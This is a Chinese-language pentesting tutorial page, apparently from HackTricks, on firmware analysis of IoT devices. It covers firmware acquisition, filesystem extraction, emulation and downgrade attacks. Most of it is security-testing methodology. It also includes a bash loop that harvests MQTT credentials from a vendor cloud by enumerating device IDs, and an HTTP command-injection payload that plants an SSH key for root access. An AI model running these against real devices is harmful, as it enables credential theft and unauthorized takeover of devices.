# 固件分析

{{#include ../../banners/hacktricks-training.md}}

## **介绍**

### 相关资源


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


固件是使设备正常运行的关键软件，通过管理并促进硬件组件与用户交互的软件之间的通信来实现这一点。它存储在永久性存储器中，确保设备从上电那一刻起就能访问重要指令，进而引导操作系统启动。检查并可能修改固件是识别安全漏洞的关键步骤。

## **信息收集**

**信息收集** 是理解设备构成及其所用技术的关键第一步。该过程包括收集以下数据：

- 设备的 CPU 架构和运行的操作系统
- 引导加载程序（bootloader）细节
- 硬件布局和 datasheets
- 代码库指标和源码位置
- 外部库和许可证类型
- 更新历史和监管认证
- 架构图和流程图
- 安全评估和已识别的漏洞

为此，**open-source intelligence (OSINT)** 工具非常有价值，手动和自动化审查任何可用的开源软件组件也同样重要。像 [Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 这样的工具提供免费静态分析，可以用来发现潜在问题。

## **获取固件**

获取固件可以通过多种途径，每种途径复杂度不同：

- **直接** 从来源（开发者、制造商）
- **从提供的说明构建** 固件
- **从官方支持站点下载**
- 使用 **Google dork** 查询以查找托管的固件文件
- 直接访问 **云存储**，使用诸如 [S3Scanner](https://github.com/sa7mon/S3Scanner) 的工具
- 通过 man-in-the-middle 技术拦截 **updates**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接 **提取** 自设备
- 在设备通信中 **Sniffing** 更新请求
- 识别并使用 **hardcoded update endpoints**
- 从 bootloader 或网络 **Dumping**
- **拆卸并读取** 存储芯片——当所有方法都失败时，使用适当的硬件工具

## 分析固件

现在你已经 **拥有固件**，需要从中提取信息以决定如何处理。可以用于此目的的不同工具包括：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果用这些工具找不到太多内容，可以用 `binwalk -E <bin>` 检查镜像的 **熵**；如果熵低，通常不太可能被加密。如果熵高，则很可能被加密（或以某种方式被压缩）。

此外，你可以使用这些工具来提取固件中嵌入的**文件**：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) 来检查该文件。

### 获取文件系统

使用前面提到的工具（例如 `binwalk -ev <bin>`）你应该能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，通常为以下之一：squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 手动文件系统提取

有时，binwalk 的 signatures 中**不包含文件系统的 magic byte**。在这种情况下，使用 binwalk 来**找到文件系统的偏移并从二进制中切出压缩的文件系统**，然后根据其类型**手动提取**文件系统，按照下面的步骤进行。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行下面的 **dd command** 对 Squashfs 文件系统进行 carving。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
或者，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（在上面的示例中使用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 `squashfs-root` 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于带 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 固件分析

一旦获取固件，就需要对其进行拆解以了解其结构和潜在漏洞。该过程涉及使用各种工具来分析并从固件镜像中提取有价值的数据。

### 初步分析工具

下面给出一组用于初步检查二进制文件（在文中称为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据以及了解分区和文件系统的详细信息：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
要评估镜像的加密状态，可使用 `binwalk -E <bin>` 检查 **熵**。低熵表示可能未加密，而高熵则可能表示已加密或被压缩。

要提取 **嵌入的文件**，建议使用像 **file-data-carving-recovery-tools** 文档这样的工具和资源，以及用于文件检查的 **binvis.io**。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，通常会提取到以文件系统类型命名的目录中（例如 squashfs、ubifs）。但当 **binwalk** 因缺少魔数而无法识别文件系统类型时，就需要手动提取。这需要先使用 `binwalk` 定位文件系统的偏移，然后用 `dd` 命令从镜像中抽取文件系统：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取内容。

### 文件系统分析

提取出文件系统后，开始搜索安全缺陷。重点检查不安全的网络 daemon、硬编码凭证、API 端点、更新服务器功能、未编译的代码、启动脚本，以及用于离线分析的已编译二进制文件。

**关键位置** 和 **项目** 要检查包括：

- **etc/shadow** 和 **etc/passwd**（用于查找用户凭证）
- SSL 证书和密钥位于 **etc/ssl**
- 配置和脚本文件，检查潜在漏洞
- 嵌入的二进制文件，供进一步分析
- 常见的 IoT 设备 web 服务器和二进制文件

有若干工具可用于发现文件系统中的敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker) 用于敏感信息搜索
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) 用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 和 [**EMBA**](https://github.com/e-m-b-a/emba) 用于静态和动态分析

### 对已编译二进制的安全检查

在文件系统中找到的源代码和已编译二进制都必须仔细检查以发现漏洞。像用于 Unix 二进制的 **checksec.sh** 和用于 Windows 二进制的 **PESecurity** 这样的工具可以帮助识别可能被利用的未受保护二进制。

## 通过派生的 URL token 收集云配置和 MQTT 凭证

许多 IoT 中心从如下的云端点获取每个设备的配置：

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

在固件分析过程中，你可能会发现 <token> 是在本地由设备 ID 和硬编码密钥派生的，例如：

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

这种设计使得任何知道 deviceId 和 STATIC_KEY 的人都能重构该 URL 并拉取云配置，通常会暴露明文的 MQTT 凭证和主题前缀。

实践流程：

1) 从 UART 启动日志中提取 deviceId

- 连接一个 3.3V UART 适配器（TX/RX/GND）并捕获日志：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印 cloud config URL 模式和 broker 地址的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从固件中恢复 STATIC_KEY 和 token 算法

- 将二进制加载到 Ghidra/radare2 并搜索配置路径 ("/pf/") 或 MD5 的用法。
- 确认算法（例如 MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导 token 并将摘要转为大写：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 收集 cloud 配置和 MQTT 凭据

- 组合 URL 并使用 curl 获取 JSON；使用 jq 解析以提取凭据：
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 滥用 plaintext MQTT 和 弱 topic ACLs（如果存在）

- 使用 recovered credentials 来 subscribe 到 maintenance topics 并查找 sensitive events：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的设备 ID（在大规模、有授权的情况下）

- 许多生态系统在供应商 OUI/product/type 字节之后嵌入一个顺序后缀。
- 你可以以编程方式遍历候选 ID、派生 tokens 并获取 configs：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意事项
- 在尝试进行大规模枚举之前，始终获得明确授权。
- 尽可能优先使用仿真或静态分析来恢复秘密，而不是修改目标硬件。

固件仿真过程可以对设备的运行或单个程序进行 **动态分析**。这种方法可能会遇到硬件或架构依赖性的问题，但将根文件系统或特定二进制文件转移到具有匹配架构和字节序的设备（例如 Raspberry Pi）或预构建的虚拟机上，可以便于进一步测试。

### 模拟单个二进制程序

在检查单个程序时，确定程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要模拟 MIPS 架构的二进制文件，可以使用以下命令：
```bash
file ./squashfs-root/bin/busybox
```
并安装必要的仿真工具：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS（大端序），`qemu-mips` 被使用；对于小端序的二进制文件，则选择 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制文件，过程类似，使用 `qemu-arm` 进行仿真。

### Full System Emulation

像 [Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可以实现完整的固件仿真，自动化该过程并辅助动态分析。

## Dynamic Analysis in Practice

在此阶段，会使用真实设备或仿真设备环境进行分析。保持对操作系统和文件系统的 shell 访问非常重要。仿真可能无法完美模拟硬件交互，因此需要不时重启仿真。分析应反复检查文件系统，利用暴露的网页和网络服务，并挖掘 bootloader 漏洞。固件完整性测试对于识别潜在后门漏洞至关重要。

## Runtime Analysis Techniques

运行时分析涉及在进程或二进制的运行环境中与其交互，使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，并通过 fuzzing 等技术识别漏洞。

## Binary Exploitation and Proof-of-Concept

为已识别的漏洞开发 PoC 需要对目标架构有深入理解并使用低级语言编程。嵌入式系统中的二进制运行时保护较少见，但如果存在，可能需要使用如 Return Oriented Programming (ROP) 等技术。

## Prepared Operating Systems for Firmware Analysis

像 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 这样的操作系统提供了为固件安全测试预配置的环境，配备了必要的工具。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS 是一个发行版，旨在帮助你对 IoT 设备进行安全评估和渗透测试。它通过提供预配置并加载了所有必要工具的环境，为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 基于 Ubuntu 18.04 的嵌入式安全测试操作系统，预装了固件安全测试工具。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

即使厂商对固件镜像实施了密码签名校验，**版本回滚（降级）保护经常被忽略**。当 boot- 或 recovery-loader 仅使用嵌入的公钥验证签名，却不比较要刷写镜像的*版本*（或单调计数器）时，攻击者可以合法地安装一个仍具有有效签名的 **较旧、存在漏洞的固件**，从而重新引入已修补的漏洞。

典型攻击流程：

1. **获取已签名的旧镜像**
* 从厂商的公开下载门户、CDN 或支持网站获取。
* 从配套的移动/桌面应用中提取（例如在 Android APK 的 `assets/firmware/` 内）。
* 从第三方仓库检索，例如 VirusTotal、互联网档案、论坛等。
2. **通过任一暴露的更新通道将镜像上传或提供给设备**：
* Web UI、mobile-app API、USB、TFTP、MQTT 等。
* 许多消费级 IoT 设备暴露出 *unauthenticated* HTTP(S) 端点，这些端点接受 Base64 编码的固件二进制块，在服务器端解码并触发恢复/升级。
3. 降级后，利用在较新版本中已被修补的漏洞（例如后来添加的命令注入过滤器）。
4. 可选地在获得持久性后重新刷回最新镜像或禁用更新以避免被发现。

### 示例：降级后的命令注入
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在存在漏洞（被降级）的固件中，`md5` 参数被直接拼接到 shell 命令中且未做清理，允许 injection 任意命令（此处 —— 启用 SSH key-based root access）。后续固件版本引入了基本字符过滤，但缺乏降级保护使得该修复徒劳。

### 从移动应用提取固件

许多厂商会把完整的固件镜像打包在其配套的移动应用中，以便应用可以通过 Bluetooth/Wi-Fi 更新设备。这些包通常以未加密形式存放在 APK/APEX 的路径（例如 `assets/fw/` 或 `res/raw/`）下。像 `apktool`、`ghidra` 或甚至直接用 `unzip` 这样的工具都可以在不接触物理硬件的情况下提取已签名的镜像。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 评估更新逻辑的检查清单

* 传输/认证到 *更新端点* 是否有足够的保护（TLS + authentication）？
* 设备在刷写前是否比较 **版本号** 或 **单调防回滚计数器**？
* 映像是否在安全引导链中被验证（例如签名由 ROM code 检查）？
* 是否由 userland code 执行额外的合理性检查（例如允许的分区映射、型号）？
* *部分* 或 *备份* 更新流程是否重复使用相同的验证逻辑？

> 💡  如果上述任何一项缺失，平台很可能容易受到回滚攻击。

## 供练习的易受攻击固件

要练习在固件中发现漏洞，可使用以下易受攻击的固件项目作为起点。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 参考资料

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
